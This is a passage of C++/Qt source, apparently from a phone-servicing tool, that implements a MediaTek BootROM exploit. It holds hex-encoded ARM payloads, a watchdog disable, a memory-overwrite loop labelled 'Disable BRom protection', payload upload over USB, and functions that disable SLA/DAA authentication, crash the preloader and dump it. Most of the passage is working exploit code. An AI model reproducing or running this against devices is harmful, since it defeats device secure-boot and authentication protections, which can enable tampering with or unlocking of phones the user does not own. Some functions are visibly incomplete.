            info.payload = qbyte::fromHex("01308FE213FF2FE12DE9FF41434C44487C44264656F80C3B78441A68996891605D6800F0C1F8304600F0BEF83D48784400F0BAF83C48784400F0B6F83B48784400F0B2F8012263691046002198473848784400F0A9F82F4B042102A8029300F079F8A2694FF4E061324B92087B4443F822100B21E2699160226A1360E2691360636A0BB100221A602B4B7B449A6A002302B1136007EE153F284F0024DFF8A08028481D4A7F44F8448DF807307844039200F07AF87A681368DB07FCD40DF1070601213046A84704AB9DF80720234413F8043C934204D04046002400F065F8EFE7DB43012130468DF8073000F033F816480134784400F058F8042CDBD11348784400F052F8124B7B44DB6A984704B0BDE8F08100BFA1A2A3A4A00A500520020000A4010000970100009E010000B4010000A9010000F4010000A60100008C0100006701000054010000290100001F0100002A01000010B5054C7C4423689B6898472368BDE81040DB68184700BFD8000000054B7B445A6813689B06FCD5034B7B449B681860704700BFBE000000B20000000A28014608B502D10D20FFF7E9FFBDE808400846FFF7E4BF38B505460078002408B9204638BD0134FFF7EAFF285DF7E7456E746572656420002062726F6D20706174636865720A00436F70797269676874206B3479307A2F626B65726C657220323032310A00523A5553420A00533A41434B0A00573A48616E647368616B650A000A463A48616E647368616B650A002E000A413A48616E647368616B650A000001000000D8E50000142000110020001162726F6D5F310000A74A0000280000000C2B1000BC2710004C281000546B1000C1F30000");
        }
        map.insert(target, info);
    }

    Config config = {};
        for (QMap<QString,Config>::iterator it = map.begin(); it != map.end(); it++)
        {
            Config tmp = it.value();
            if (tmp.hwcode == hw_code)
            {
                soc = it.key();
                config = tmp;
                break;
            }
        }


    if(soc == "auto")
        soc.append(QString("0x%0").arg(hw_code, 0, 16));

    if (config.hwcode == 0x950
            || config.hwcode == 0x959
            || config.hwcode == 0x989
            || config.hwcode == 0x996
            || config.hwcode == 0x816
            || config.hwcode == 0x1066
            || dump_pl
            )
    {
        if (dump_pl)
        {
            config.pl_addr = 0x100a00;
            config.payload = qbyte::fromHex("01308FE213FF2FE1F0B5002385B00193019B1A684E4B9A42514A08BF019B7A4404BF5B68019303230198019900F5807001F5A03100F0E2F848B14A4A83687A44136003F11401484A7A44C2E90013019E0223019D454F06F5807605F5003530467F442946BA1D00F0C9F8044628B1404B40F001047B44DC6010E0012307F10A02304600F0BBF84368324A23F47F43934258D1384B40F001007B44D860364A03234FF404114FF400107A440C3200F0A6F8044630B9284903234FF0007000F09EF804462E4A0223294630467A44123200F095F8002830D00223043000F08FF858B3274D042650F81C3C7D442B6113F8071F50F8102C23F0030342F001020433AA6016FB013350F80C2C02A842F001026A6119689B688B603146104B02939047002303A803938CB1236A314603936B6998476B69204603999847124B7B44DB68984705B0F0BD104B7B4495E76B693146F2E704F01FE5F400002100000102C1C2C3C4220200001A02000018020000E0010000EC010000C8010000980100007601000078010000260100001A010000054B7B441A6813689B06FCD5034B7B445B681860704700BFD2000000C6000000064B07B504210DEB01007B449B689847019800BA03B05DF804FB00BFAA0000000A28014608B502D10D20FFF7D9FFBDE808400846FFF7D4BF38B505460078002408B9204638BD0134FFF7EAFF285DF7E7F0B50024884210D30020F0BD30F8157032F81560B7420AD10134E4B2A342F4D00135AB42F2D80230ECE70025F9E70024F9E7CBB212B1C1F30221117020F00300043000EB83007047315F454E930FFFF7F4FF10B54D4D4D013800A00A500500000020001100700010");
        }
        if(!mtk_new_expolit(config, dump_pl))
            return 0;

        return 1;
    }
    else
    {
        if (config.payloadname.isEmpty())
        {
            send_log_red("not supported chipset id");
            return false;
        }

        send_log_normal("Disabling watchdog..\n");

        if (!Write32(config.wdg_addr, (QList<quint32>() << 0x22000064)))
        {
            send_log_red("disable WDT error!");
            return false;
        }

        QByteArray payload = {};
        if (!prepare_payload(config, payload))
        {
            send_log_red("failed to prepare payload!");
            return 0;
        }

//!Read BRom Ver & PL Ver.
        if(!write8(0xff))
            return 0;
        quint8 ack0 = {}; //05
        if(!read8(&ack0)) //ff
            return 0;
        if(!write8(0xfe))
            return 0;
        quint8 ack1 = {}; //fe
        if(!read8(&ack1))
            return 0;

        if (!BRom_WriteCmd32(config.wdg_addr, config.uart_base))
            return 0;
        if (!BRom_WriteCmd32(config.wdg_addr + 0x50, qFromBigEndian(config.payload_addr)))
            return 0;

        send_log_normal("Disable BRom protection...\n");

        for (int i = 0; i < 0x40; i++)
        {
            quint mask((0x41 - i));
            quint rlen(mask * 4);
            quint addr((config.wdg_addr + 0x50) - (rlen - 4));
            qbool read(secure?(i >= 0x2c) : 1);
            if (!BRom_ReadCmd32(addr, mask, read, rlen))
                return 0;
        }

        if (!brom_write8_echo(0xe0))
            return 0;
        if (!brom_write32_echo(payload.size()))
            return 0;

        quint16 check;
        read16(&check);
        if (!write_ptr((char*)payload.constData(), payload.size()))
        {
            send_log_red("failed to send payload");
            return false;
        }

        quint32 check32;
        read32(&check32);
        check32 = qFromBigEndian(check32);

        send_log_info("send usb_ctrl data ...!");

        qbyte null = {};
        if(!UsbSendDevCtrl(0xa1, 0x00, 0x00, config.var1, null))
            return 0;

        quint32 checka = 0;
        read32(&checka);
        return (checka == 0xa1a2a3a4);
    }
}

bool boot_rom::brom_write8_echo(quint8 cmd)
{
    quint8 ack = 0;
    write8(cmd);
    read8(&ack);
    if(cmd != ack)
        return 0;

    return 1;
}

bool boot_rom::brom_write32_echo(quint32 cmd)
{
    quint32 ack = 0;
    write32(cmd);
    read32(&ack);
    if(cmd != ack)
        return false;

    return true;
}

bool boot_rom::find_mtk_device(qint &port_num, bool &is_pl)
{
    USBCore::USBDevInfo devinfo = {};
    USBCore::USBFinder *usb(new USBCore::USBFinder());

    devinfo.timeout = 60000;
    devinfo.notihnd = QUuid::createUuid().toString().mid(1, 8);

    devinfo.filter.push_back("USB\\VID_0E8D&PID_0003");//[BOOTROM_VCOM]
    devinfo.filter.push_back("USB\\VID_0E8D&PID_2000");//[PRELOADER_VCOM]
    devinfo.filter.push_back("USB\\VID_0E8D&PID_2001");//[DA_HIGHSPEED_VCOM]
    devinfo.filter.push_back("USB\\VID_0E8D&PID_2006");//[META_VCOM]
    devinfo.filter.push_back("USB\\VID_22D9&PID_0006");//[OPPO_PRELOADER]
    devinfo.filter.push_back("USB\\VID_1004&PID_6000");//[COMPOSITE_PRELOADER_VCOM + COMPOSITE_DA_VCOM] + LG

    devinfo.guids.push_back(QUuid("{4d36e978-e325-11ce-bfc1-08002be10318}"));//GUID_DEVINTERFACE_COMPORT
    devinfo.guids.push_back(QUuid("{a5dcbf10-6530-11d2-901f-00c04fb951ed}"));//GUID_DEVINTERFACE_USB_DEVICE
    devinfo.guids.push_back(QUuid("{86e0d1e0-8089-11d0-9ce4-08003e301f73}"));//GUID_DEVINTERFACE_COMPORT

    send_log_normal("Waiting for mtk usb device... ");

    if (!usb->WaitForUsbDevice(devinfo))
    {
        send_log_fail("device not found!");
        return 0;
    }

    port_num = devinfo.PortNum;

    send_log_succes("ok");

    send_log_normal("BootMode : ");
    send_log_info(qstr("%0[COM%1]").arg(devinfo.BootMode).arg(devinfo.PortNum));
    send_log_normal("USBDriver : ");
    send_log_fail(qstr("%0:%1:%2").arg(devinfo.USBDriver, devinfo.DriverVersion, devinfo.DriverDate));

    qInfo().noquote().nospace() << "USBDevInfo::PortName:" << devinfo.PortName;
    qInfo().noquote().nospace() << "USBDevInfo::Manufacturer:" << devinfo.Manufacturer;
    qInfo().noquote().nospace() << "USBDevInfo::USBDriver:" << devinfo.USBDriver;
    qInfo().noquote().nospace() << "USBDevInfo::DriverVersion:" << devinfo.DriverVersion;
    qInfo().noquote().nospace() << "USBDevInfo::DriverDate:" << devinfo.DriverDate;
    qInfo().noquote().nospace() << "USBDevInfo::PortNum:" << devinfo.PortNum;
    is_pl = devinfo.BootMode == "BootLoader";
    return 1;
}

bool boot_rom::bypass_auth()
{
    LibUsbFilterDriver(0xe8d, 0x3);

    qbool is_pl = 0;
    qint portnumber = {};
    if(!find_mtk_device(portnumber, is_pl))
        return 0;

    send_log_normal("Connecting to BootROM......\n");

    if(!connect_brom(portnumber))
        return 0;

    if(!brom_start_cmd())
        return 0;

    quint16 hcode = 0;
    if(!get_chip_info(hcode))
        return 0;

    if(is_pl)
    {
        crash_preloader();
    }

    get_extra_info();

    bool secure = false;
    if(!get_security_config(secure))
        return 0;

    bool ok = brom_set_sec_cfg(hcode, secure, 0);

    disconnect_brom();

    if(ok)
    {
        send_log_succes("MTK Auth Disable(SLA/DAA) success!");

        send_log_info("now you can use SP Flash Tool or any MTK Tool");
    }
    else
    {
        send_log_fail("MTK Auth Disable(SLA/DAA) error!");
    }

    return ok;
}

bool boot_rom::dump_preloader()
{
    qbool is_pl = 0;
    qint portnumber = {};
    if(!find_mtk_device(portnumber, is_pl))
        return 0;

    send_log_normal("Connecting to BootROM......\n");

    if(!connect_brom(portnumber))
        return 0;

    if(!brom_start_cmd())
        return 0;

    quint16 hcode = 0;
    if(!get_chip_info(hcode))
        return 0;

    if(is_pl)
    {
        crash_preloader();
    }

    get_extra_info();

    bool secure = false;
    if(!get_security_config(secure))
        return 0;

    bool ok = brom_set_sec_cfg(hcode, secure, true);

    disconnect_brom();
}

bool boot_rom::crash_preloader(bool prl, qbool disable_auth)
{
    if(prl)
    {
        qbool is_pl = 0;
        qint portnumber = {};
        if(!find_mtk_device(portnumber, is_pl))
            return 0;

        send_log_normal("Connecting to BootROM......\n");

        if(!connect_brom(portnumber))
            return 0;

        if(!brom_start_cmd())
            return false;

        quint16 hcode = 0;
        if(!get_chip_info(hcode))
            return false;
    }

    send_log_normal("Switch preloader to bootrom...");

    qint crash_method = 0;

    if(crash_method == 0)
    {
        qbyte empy_da(qbyte::fromHex("5c7830305c7830315c7839465c7845355c7831305c7846465c7832465c784531"));
        quint16 cSum = 0;
        if(!SendDA(0, empy_da.length(), 0, empy_da, cSum))
        {
            disconnect_brom();
            return 0;
        }
    }
    else
    {
        if (!brom_write8_echo(BROM_CMD_READ16))
            return 0;
        if (!write32(0x00, 1))
            return 0;
        if (!write32(0x01, 1))
            return 0;
    }

    disconnect_brom();

    send_log_succes("crash succeed!");

    if (disable_auth)
    {
        qbool is_pl = 0;
        qint portnumber = {};
        if(!find_mtk_device(portnumber, is_pl))
            return 0;

        send_log_normal("Connecting to BootROM......\n");

        if(!connect_brom(portnumber))
            return 0;

        if(!brom_start_cmd())
            return 0;

        quint16 hcode = 0;
        if(!get_chip_info(hcode))
            return 0;

        return 1;
    }
}

bool boot_rom::connect_mtk_device()
{

}

QSharedPointer<mThreadOPT> boot_rom::get_opt() const
{
    return opt_;
}

void boot_rom::set_opt(const QSharedPointer<mThreadOPT> &opt)
{
    opt_ = opt;
}

